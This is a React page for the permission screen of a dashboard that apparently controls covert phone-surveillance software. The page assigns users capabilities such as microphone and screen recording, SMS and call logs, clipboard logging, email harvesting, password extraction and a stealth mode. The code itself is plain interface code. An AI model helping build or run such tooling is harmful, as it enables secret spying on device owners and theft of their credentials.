import { useState } from "react";
import DashboardLayout from "@/components/DashboardLayout";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Tabs,
  TabsContent,
  TabsList,
  TabsTrigger,
} from "@/components/ui/tabs";
import {
  Shield,
  MapPin,
  Mic,
  MessageSquare,
  Phone,
  FileText,
  Copy,
  Bell,
  Eye,
  Lock,
  Video,
  Camera,
  Search,
  Edit,
} from "lucide-react";
import { toast } from "sonner";
import { trpc } from "@/lib/trpc";

interface Permission {
  code: string;
  description: string;
  category: string;
}

const PERMISSION_ICONS: Record<string, React.ReactNode> = {
  GPS_LOGGING: <MapPin className="w-5 h-5" />,
  MICROPHONE_RECORDING: <Mic className="w-5 h-5" />,
  VIEW_CONTACTS: <FileText className="w-5 h-5" />,
  SMS_LOGS: <MessageSquare className="w-5 h-5" />,
  SEND_SMS: <MessageSquare className="w-5 h-5" />,
  CALL_LOGS: <Phone className="w-5 h-5" />,
  VIEW_INSTALLED_APPS: <FileText className="w-5 h-5" />,
  CLIPBOARD_LOGGING: <Copy className="w-5 h-5" />,
  NOTIFICATION_LOGGING: <Bell className="w-5 h-5" />,
  FILE_EXPLORER: <FileText className="w-5 h-5" />,
  SCREEN_RECORDING: <Video className="w-5 h-5" />,
  CAMERA_ACCESS: <Camera className="w-5 h-5" />,
  LOCATION_TRACKING: <MapPin className="w-5 h-5" />,
  EMAIL_HARVESTING: <FileText className="w-5 h-5" />,
  PASSWORD_EXTRACTION: <Lock className="w-5 h-5" />,
  STEALTH_MODE: <Eye className="w-5 h-5" />,
};

export default function Permissions() {
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedCategory, setSelectedCategory] = useState<string>("all");
  const utils = trpc.useUtils();

  const { data: allUsers = [] } = trpc.users.getAll.useQuery();
  const { data: allPermissions = [] } = trpc.permissions.getAllPermissions.useQuery();
  const { data: categories = ["all"] } = trpc.permissions.getCategories.useQuery(undefined, {
    select: (data) => ["all", ...data.map((c) => c.name)],
  });

  const assignMutation = trpc.permissions.assignUserPermission.useMutation({
    onSuccess: () => {
      toast.success("Permission assigned");
      utils.permissions.getUserPermissions.invalidate();
    },
    onError: (err) => toast.error(err.message),
  });

  const revokeMutation = trpc.permissions.revokeUserPermission.useMutation({
    onSuccess: () => {
      toast.success("Permission revoked");
      utils.permissions.getUserPermissions.invalidate();
    },
    onError: (err) => toast.error(err.message),
  });

  const getRiskLevel = (code: string) => {
    const critical = ["GPS_LOGGING", "MICROPHONE_RECORDING", "SMS_LOGS", "SCREEN_RECORDING", "PASSWORD_EXTRACTION"];
    const high = ["CAMERA_ACCESS", "FILE_EXPLORER", "CLIPBOARD_LOGGING", "SEND_SMS"];
    if (critical.includes(code)) return "critical";
    if (high.includes(code)) return "high";
    return "medium";
  };

  const getRiskColor = (level: string) => {
    switch (level) {
      case "critical":
        return "text-red-400 bg-red-500/10 border-red-500/30";
      case "high":
        return "text-orange-400 bg-orange-500/10 border-orange-500/30";
      case "medium":
        return "text-yellow-400 bg-yellow-500/10 border-yellow-500/30";
      default:
        return "text-green-400 bg-green-500/10 border-green-500/30";
    }
  };

  const filteredPermissions = allPermissions.filter((perm) => {
    const matchesSearch = perm.code.toLowerCase().includes(searchTerm.toLowerCase()) ||
      perm.description.toLowerCase().includes(searchTerm.toLowerCase());
    const matchesCategory = selectedCategory === "all" || perm.category === selectedCategory;
    return matchesSearch && matchesCategory;
  });

  return (
    <DashboardLayout title="Permission Management">
      <div className="space-y-6">
        <Tabs defaultValue="permissions" className="w-full">
          <TabsList className="grid w-full grid-cols-2 bg-card border-glow-cyan">
            <TabsTrigger value="permissions" className="data-[state=active]:bg-accent/20">
              <Shield className="w-4 h-4 mr-2" />
              All Permissions
            </TabsTrigger>
            <TabsTrigger value="users" className="data-[state=active]:bg-accent/20">
              <FileText className="w-4 h-4 mr-2" />
              User Assignments
            </TabsTrigger>
          </TabsList>

          <TabsContent value="permissions" className="space-y-6">
            <div className="card-neon p-4">
              <div className="flex flex-col md:flex-row gap-4">
                <div className="relative flex-1">
                  <Search className="absolute left-3 top-3 w-5 h-5 text-muted-foreground" />
                  <Input
                    placeholder="Search permissions..."
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                    className="input-neon pl-10"
                  />
                </div>
                <div className="flex gap-2 overflow-x-auto pb-2">
                  {categories.map((cat) => (
                    <Button
                      key={cat}
                      onClick={() => setSelectedCategory(cat)}
                      className={`whitespace-nowrap ${
                        selectedCategory === cat ? "btn-neon-cyan" : "btn-neon"
                      }`}
                      size="sm"
                    >
                      {cat}
                    </Button>
                  ))}
                </div>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              {filteredPermissions.map((perm) => (
                <div key={perm.code} className="card-neon p-4">
                  <div className="flex items-start justify-between mb-3">
                    <div className="flex items-start gap-3">
                      <div className="text-purple-400 mt-1">
                        {PERMISSION_ICONS[perm.code] || <Shield className="w-5 h-5" />}
                      </div>
                      <div>
                        <h4 className="font-bold text-sm">{perm.code.replace(/_/g, " ")}</h4>
                        <p className="text-xs text-muted-foreground">{perm.category}</p>
                      </div>
                    </div>
                    <span className={`text-xs font-bold px-2 py-1 rounded border-2 ${getRiskColor(getRiskLevel(perm.code))}`}>
                      {getRiskLevel(perm.code).toUpperCase()}
                    </span>
                  </div>
                  <p className="text-xs text-muted-foreground mb-3">{perm.description}</p>
                </div>
              ))}
            </div>
          </TabsContent>

          <TabsContent value="users" className="space-y-6">
            {allUsers.map((user) => (
              <UserPermissionCard
                key={user.id}
                user={user}
                allPermissions={allPermissions}
                assignMutation={assignMutation}
                revokeMutation={revokeMutation}
              />
            ))}
          </TabsContent>
        </Tabs>

        <div className="border-2 border-yellow-500 bg-yellow-500/10 p-4 rounded-lg">
          <p className="text-sm font-medium text-yellow-400 mb-2">
            ⚠️ Permission Assignment Warning
          </p>
          <p className="text-xs text-muted-foreground">
            Granting permissions is critical. Regularly audit and revoke unused permissions.
          </p>
        </div>
      </div>
    </DashboardLayout>
  );
}

interface UserPermissionCardProps {
  user: any;
  allPermissions: any[];
  assignMutation: any;
  revokeMutation: any;
}

function UserPermissionCard({ user, allPermissions, assignMutation, revokeMutation }: UserPermissionCardProps) {
  const { data: userPerms = [], isLoading } = trpc.permissions.getUserPermissions.useQuery({ userId: user.id });
  const userPermCodes = userPerms.map(p => p.code);

  const toggle = (code: string) => {
    if (userPermCodes.includes(code)) {
      revokeMutation.mutate({ userId: user.id, permission: code });
    } else {
      assignMutation.mutate({ userId: user.id, permission: code });
    }
  };

  return (
    <div className="card-neon mb-6">
      <div className="border-b border-glow-cyan pb-4 mb-4">
        <h3 className="text-lg font-bold">{user.name || user.email}</h3>
        <p className="text-sm text-muted-foreground">{userPerms.length} permissions assigned</p>
      </div>
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
        {allPermissions.map((perm) => {
          const isAssigned = userPermCodes.includes(perm.code);
          return (
            <button
              key={perm.code}
              disabled={isLoading || assignMutation.isPending || revokeMutation.isPending}
              onClick={() => toggle(perm.code)}
              className={`p-3 rounded border-2 transition-all text-left ${
                isAssigned ? "border-glow-cyan bg-cyan-500/10" : "border-glow-cyan/30 bg-accent/5"
              }`}
            >
              <div className="flex items-start gap-2">
                <div className={isAssigned ? "text-cyan-400" : "text-muted-foreground"}>
                  {PERMISSION_ICONS[perm.code] || <Shield className="w-5 h-5" />}
                </div>
                <div className="flex-1">
                  <p className="text-xs font-bold">{perm.code.replace(/_/g, " ")}</p>
                  <p className={`text-xs mt-1 ${isAssigned ? "text-cyan-300" : "text-muted-foreground"}`}>
                    {isAssigned ? "✓ Assigned" : "Not assigned"}
                  </p>
                </div>
              </div>
            </button>
          );
        })}
      </div>
    </div>
  );
}
